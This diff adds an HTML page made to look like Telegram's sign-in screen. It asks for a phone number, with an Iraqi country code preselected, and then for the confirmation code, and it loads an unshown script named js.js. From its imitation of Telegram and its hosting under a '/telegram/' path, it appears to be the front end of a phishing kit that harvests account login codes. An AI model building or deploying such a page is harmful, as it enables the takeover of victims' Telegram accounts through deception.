@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Login</title>
+    <link rel="stylesheet" href="cs.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Step 1: Enter Phone Number -->
+        <div class="login-box" id="step-1">
+            <img src="/telegram/telgramlologogo.png" alt="Telegram Logo" class="logo">
+            <h1>Sign in to Telegram</h1>
+            <p>Please confirm your country code and enter your phone number.</p>
+            <div class="input-group">
+                <label id="labelcountry" for="country">Country</label>
+                <select id="country">
+                    <option value="Iraq">Iraq</option>
+                    <!-- Add more countries as options -->
+                </select>
+            </div>
+            <div class="input-group">
+                <label for="phone">Phone Number</label>
+                <input type="tel" id="phone" placeholder="+964 ___ ___ ____">
+            </div>
+            <div class="input-group">
+                <input type="checkbox" id="keep-signed-in">
+                <label for="keep-signed-in">Keep me signed in</label>
+            </div>
+            <button class="btn" id="next-btn">NEXT</button>
+        </div>
+
+        <!-- Step 2: Confirm Phone Number and Enter Code -->
+        <div class="login-box" id="step-2" style="display: none;">
+            <img src="/telegram/telgramlologogo.png" alt="Telegram Logo" class="logo">
+            <h1>Enter Confirmation Code</h1>
+            <p>A confirmation code was sent to your phone number.</p>
+            <div class="input-group">
+                <label for="confirm-code">Confirmation Code</label>
+                <input type="text" id="confirm-code" placeholder="Enter the code here">
+            </div>
+            <button class="btn" id="confirm-btn">CONFIRM</button>
+        </div>
+    </div>
+    <script src="js.js"></script>
+</body>
+</html>
